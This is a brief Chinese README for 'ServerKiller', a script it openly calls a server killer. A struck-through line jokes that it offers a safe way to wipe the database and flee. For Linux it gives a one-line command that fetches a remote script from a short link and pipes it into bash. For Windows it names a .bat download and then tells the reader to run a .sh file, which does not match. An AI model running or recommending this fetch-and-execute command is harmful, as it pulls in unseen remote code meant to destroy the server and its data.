# ServerKiller

> 一个服务器杀手脚本，支持各种系统使用。

## 介绍

~~这个脚本的旨在提供一种安全的删库跑路方式。~~

## 如何使用

### Linux 版 

```shell
bash <(curl -s -L https://git.io/ServerKiller.sh)
```

### Windows 版

先将 `ServerKiller.bat` 下载好，然后在下载目录执行

```shell
.\Serverkiller.sh
```

下载地址：<https://git.io/ServerKiller.bat>
